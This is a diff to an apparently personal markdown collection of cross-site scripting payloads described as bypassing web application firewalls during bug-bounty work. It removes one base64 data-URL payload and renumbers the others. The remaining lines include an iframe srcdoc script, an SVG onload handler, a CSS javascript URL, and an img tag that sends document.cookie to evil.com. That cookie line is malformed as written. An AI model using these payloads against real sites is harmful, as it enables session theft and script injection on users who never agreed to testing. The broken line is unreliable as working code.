@@ -15,25 +15,19 @@ Some collection of xss payloads that worked for me to bypass wafs while doing bb
 <iframe srcdoc="<script>alert('XSS')</script>">
 ```
 
-3. **Using `data:` URL to Execute JavaScript:**
-
-```html
-<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click me</a>
-```
-
-4. **Data Exfiltration through Image Source (Cross-Domain):**
+3. **Data Exfiltration through Image Source (Cross-Domain):**
 
 ```html
 <img src="https://evil.com/?data=" + encodeURIComponent(document.cookie)">
 ```
 
-5. **CSS-Based XSS:**
+4. **CSS-Based XSS:**
 
 ```css
 body { background-image: url('javascript:alert("XSS")'); }
 ```
 
-6. **SVG XSS (Cross-Site Scripting using SVG):**
+5. **SVG XSS (Cross-Site Scripting using SVG):**
 
 ```html
 <svg/onload=alert(document.domain)>
